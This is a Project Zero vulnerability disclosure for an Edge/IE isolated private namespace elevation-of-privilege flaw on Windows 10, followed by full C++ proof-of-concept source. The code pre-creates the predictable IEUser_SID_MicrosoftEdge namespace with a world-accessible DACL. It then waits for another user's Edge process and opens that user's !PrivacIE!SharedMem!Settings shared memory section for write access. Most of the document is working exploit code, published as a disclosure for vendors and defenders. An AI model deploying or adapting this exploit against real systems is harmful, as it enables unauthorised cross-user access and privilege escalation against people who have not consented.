/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=878

Windows: Edge/IE Isolated Private Namespace Insecure Boundary Descriptor EoP
Platform: Windows 10 10586, Edge 25.10586.0.0 not tested 8.1 Update 2 or Windows 7
Class: Elevation of Privilege

Summary:
The isolated private namespace created by ierutils has an insecure Boundary Descriptor which allows any non-appcontainer sandbox process (such as chrome) or other users on the same system to gain elevated permissions on the namespace directory which could lead to elevation of privilege. 

Description:

In iertutils library IsoOpenPrivateNamespace creates a new Window private namespace (which is an isolated object directory which can be referred to using a boundary descriptor). The function in most cases first calls OpenPrivateNamespace before falling back to CreatePrivateNamespace. The boundary descriptor used for this operation only has an easily guessable name, so it’s possible for another application to create the namespace prior to Edge/IE starting, ensuring the directory and other object’s created underneath are accessible. 

In order to attack this the Edge/IE process has to have not been started yet. This might be the case if trying to exploit from another sandbox application or from another user. The per-user namespace IEUser_USERSID_MicrosoftEdge is trivially guessable, however the  IsoScope relies on the PID of the process. However there’s no limit on the number of private namespaces a process can register (seems to just be based on resource consumption limits). I’ve easily created 100,000 with different names before I gave up, so it would be trivial to plant the namespace name for any new Edge process, set the DACL as appropriate and wait for the user to login. 

Also note on IE that the Isolated Scope namespace seems to be created before opened which would preclude this attack on that type, but it would still be exploitable on the per-user one. 

Doing this would result in any new object in the isolated namespace being created by Edge or IE being accessible to the attacker. I’ve not spent much time actually working out what is or isn’t exploitable but at the least you’d get some level of information disclosure and no doubt some potential for EoP.

Proof of Concept:

I’ve provided a PoC as a C++ source code file. You need to compile it first targeted with Visual Studio 2015. It will create the user namespace. 

1) Compile the C++ source code file.
2) Execute the PoC as another different user to the current one on the same system, this using runas. Pass the name of the user to spoof on the command line. 
3) Start a copy of Edge
4) The PoC should print that it’s found and accessed the !PrivacIE!SharedMem!Settings section from the new Edge process.

Expected Result:
Planting the private namespace is not allowed.

Observed Result:
Access to the private namespace is granted and the DACL of the directory is set set to a list of inherited permissions which will be used for new objects.
*/

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <winternl.h>
#include <sddl.h>
#include <memory>
#include <string>
#include <TlHelp32.h>
#include <strstream>
#include <sstream>

typedef NTSTATUS(WINAPI* NtCreateLowBoxToken)(
  OUT PHANDLE token,
  IN HANDLE original_handle,
  IN ACCESS_MASK access,
  IN POBJECT_ATTRIBUTES object_attribute,
  IN PSID appcontainer_sid,
  IN DWORD capabilityCount,
  IN PSID_AND_ATTRIBUTES capabilities,
  IN DWORD handle_count,
  IN PHANDLE handles);

struct HandleDeleter
{
  typedef HANDLE pointer;
  void operator()(HANDLE handle)
  {
    if (handle && handle != INVALID_HANDLE_VALUE)
    {
      DWORD last_error = ::GetLastError();
      CloseHandle(handle);
      ::SetLastError(last_error);
    }
  }
};

typedef std::unique_ptr<HANDLE, HandleDeleter> scoped_handle;

struct LocalFreeDeleter
{
  typedef void* pointer;
  void operator()(void* p)
  {
    if (p)
      ::LocalFree(p);
  }
};

typedef std::unique_ptr<void, LocalFreeDeleter> local_free_ptr;

struct PrivateNamespaceDeleter
{
  typedef HANDLE pointer;
  void operator()(HANDLE handle)
  {
    if (handle && handle != INVALID_HANDLE_VALUE)
    {
      ::ClosePrivateNamespace(handle, 0);
    }
  }
};

struct scoped_impersonation
{
  BOOL _impersonating;
public:
  scoped_impersonation(const scoped_handle& token) {
    _impersonating = ImpersonateLoggedOnUser(token.get());
  }

  scoped_impersonation() {
    if (_impersonating)
      RevertToSelf();
  }

  BOOL impersonation() {
    return _impersonating;
  }
};

typedef std::unique_ptr<HANDLE, PrivateNamespaceDeleter> private_namespace;

std::wstring GetCurrentUserSid()
{
  HANDLE token = nullptr;
  if (!OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
    return false;
  std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);

  DWORD size = sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE;
  std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
  TOKEN_USER* user = reinterpret_cast<TOKEN_USER*>(user_bytes.get());

  if (!::GetTokenInformation(token, TokenUser, user, size, &size))
    return false;

  if (!user->User.Sid)
    return false;

  LPWSTR sid_name;
  if (!ConvertSidToStringSid(user->User.Sid, &sid_name))
    return false;

  std::wstring ret = sid_name;
  ::LocalFree(sid_name);
  return ret;
}

std::wstring GetCurrentLogonSid()
{
  HANDLE token = NULL;
  if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
    return false;
  std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);

  DWORD size = sizeof(TOKEN_GROUPS) + SECURITY_MAX_SID_SIZE;
  std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
  TOKEN_GROUPS* groups = reinterpret_cast<TOKEN_GROUPS*>(user_bytes.get());

  memset(user_bytes.get(), 0, size);

  if (!::GetTokenInformation(token, TokenLogonSid, groups, size, &size))
    return false;

  if (groups->GroupCount != 1)
    return false;

  LPWSTR sid_name;
  if (!ConvertSidToStringSid(groups->Groups[0].Sid, &sid_name))
    return false;

  std::wstring ret = sid_name;
  ::LocalFree(sid_name);
  return ret;
}

class BoundaryDescriptor
{
public:
  BoundaryDescriptor()
    : boundary_desc_(nullptr) {
  }

  ~BoundaryDescriptor() {
    if (boundary_desc_) {
      DeleteBoundaryDescriptor(boundary_desc_);
    }
  }

  bool Initialize(const wchar_t* name) {
    boundary_desc_ = ::CreateBoundaryDescriptorW(name, 0);
    if (!boundary_desc_)
      return false;

    return true;
  }

  bool AddSid(LPCWSTR sid_str)
  {
    if (_wcsicmp(sid_str, L"CU") == 0)
    {
      return AddSid(GetCurrentUserSid().c_str());
    }
    else
    {
      PSID p = nullptr;

      if (!::ConvertStringSidToSid(sid_str, &p))
      {
        return false;
      }

      std::unique_ptr<void, LocalFreeDeleter> buf(p);

      SID_IDENTIFIER_AUTHORITY il_id_auth = { { 0,0,0,0,0,0x10 } };
      PSID_IDENTIFIER_AUTHORITY sid_id_auth = GetSidIdentifierAuthority(p);

      if (memcmp(il_id_auth.Value, sid_id_auth->Value, sizeof(il_id_auth.Value)) == 0)
      {
        return !!AddIntegrityLabelToBoundaryDescriptor(&boundary_desc_, p);
      }
      else
      {
        return !!AddSIDToBoundaryDescriptor(&boundary_desc_, p);
      }
    }
  }

  HANDLE boundry_desc() {
    return boundary_desc_;
  }

private:
  HANDLE boundary_desc_;
};

scoped_handle CreateLowboxToken()
{
  PSID package_sid_p;
  if (!ConvertStringSidToSid(L"S-1-15-2-1-1-1-1-1-1-1-1-1-1-1", &package_sid_p))
  {
    printf("[ERROR] creating SID: %d\n", GetLastError());
    return nullptr;
  }
  local_free_ptr package_sid(package_sid_p);

  HANDLE process_token_h;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &process_token_h))
  {
    printf("[ERROR] error opening process token SID: %d\n", GetLastError());
    return nullptr;
  }

  scoped_handle process_token(process_token_h);

  NtCreateLowBoxToken fNtCreateLowBoxToken = (NtCreateLowBoxToken)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateLowBoxToken");
  HANDLE lowbox_token_h;
  OBJECT_ATTRIBUTES obja = {};
  obja.Length = sizeof(obja);

  NTSTATUS status = fNtCreateLowBoxToken(&lowbox_token_h, process_token_h, TOKEN_ALL_ACCESS, &obja, package_sid_p, 0, nullptr, 0, nullptr);
  if (status != 0)
  {
    printf("[ERROR] creating lowbox token: %08X\n", status);
    return nullptr;
  }

  scoped_handle lowbox_token(lowbox_token_h);
  HANDLE imp_token;

  if (!DuplicateTokenEx(lowbox_token_h, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &imp_token))
  {
    printf("[ERROR] duplicating lowbox: %d\n", GetLastError());
    return nullptr;
  }

  return scoped_handle(imp_token);
}

DWORD FindMicrosoftEdgeExe()
{
  scoped_handle th_snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
  if (!th_snapshot)
  {
    printf("[ERROR] getting snapshot: %d\n", GetLastError());
    return 0;
  }
  PROCESSENTRY32 proc_entry = {};
  proc_entry.dwSize = sizeof(proc_entry);

  if (!Process32First(th_snapshot.get(), &proc_entry))
  {
    printf("[ERROR] enumerating snapshot: %d\n", GetLastError());
    return 0;
  }

  do
  {
    if (_wcsicmp(proc_entry.szExeFile, L"microsoftedge.exe") == 0)
    {
      return proc_entry.th32ProcessID;
    }
    proc_entry.dwSize = sizeof(proc_entry);
  } while (Process32Next(th_snapshot.get(), &proc_entry));

  return 0;
}

void CreateNamespaceForUser(LPCWSTR account_name)
{
  BYTE sid_bytes[MAX_SID_SIZE];
  WCHAR domain[256];
  SID_NAME_USE name_use;
  DWORD sid_size = MAX_SID_SIZE;
  DWORD domain_size = _countof(domain);

  if (!LookupAccountName(nullptr, account_name, (PSID)sid_bytes, &sid_size, domain, &domain_size, &name_use))
  {
    printf("[ERROR] getting SId for account %ls: %d\n", account_name, GetLastError());
    return;
  }

  LPWSTR sid_str;
  ConvertSidToStringSid((PSID)sid_bytes, &sid_str);

  std::wstring boundary_name = L"IEUser_";
  boundary_name += sid_str;
  boundary_name += L"_MicrosoftEdge";

  BoundaryDescriptor boundry;
  if (!boundry.Initialize(boundary_name.c_str()))
  {
    printf("[ERROR] initializing boundary descriptor: %d\n", GetLastError());
    return;
  }

  PSECURITY_DESCRIPTOR psd;
  ULONG sd_size = 0;
  std::wstring sddl = L"D:(A;OICI;GA;;;WD)(A;OICI;GA;;;AC)(A;OICI;GA;;;WD)(A;OICI;GA;;;S-1-0-0)";
  sddl += L"(A;OICI;GA;;;" + GetCurrentUserSid() + L")";
  sddl += L"(A;OICI;GA;;;" + GetCurrentLogonSid() + L")";
  sddl += L"S:(ML;OICI;NW;;;S-1-16-0)";

  if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl.c_str(), SDDL_REVISION_1, &psd, &sd_size))
  {
    printf("[ERROR] converting SDDL: %d\n", GetLastError());
    return;
  }
  std::unique_ptr<void, LocalFreeDeleter> sd_buf(psd);

  SECURITY_ATTRIBUTES secattr = {};
  secattr.nLength = sizeof(secattr);
  secattr.lpSecurityDescriptor = psd;

  private_namespace ns(CreatePrivateNamespace(&secattr, boundry.boundry_desc(), boundary_name.c_str()));
  if (!ns)
  {
    printf("[ERROR] creating private namespace - %ls: %d\n", boundary_name.c_str(), GetLastError());
    return;
  }

  printf("[SUCCESS] Created Namespace %ls, start Edge as other user\n", boundary_name.c_str());
  
  std::wstring section_name = boundary_name + L"\\!PrivacIE!SharedMem!Settings";

  while (true)
  {
    HANDLE hMapping = OpenFileMapping(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, section_name.c_str());
    if (hMapping)
    {
      printf("[SUCCESS] Opened other user's !PrivacIE!SharedMem!Settings section for write access\n");
      return;
    }
    Sleep(1000);
  }
}

int wmain(int argc, wchar_t** argv)
{
  if (argc < 2)
  {
    printf("PoC username to access\n");
    return 1;
  }
  CreateNamespaceForUser(argv[1]);
  return 0;
}
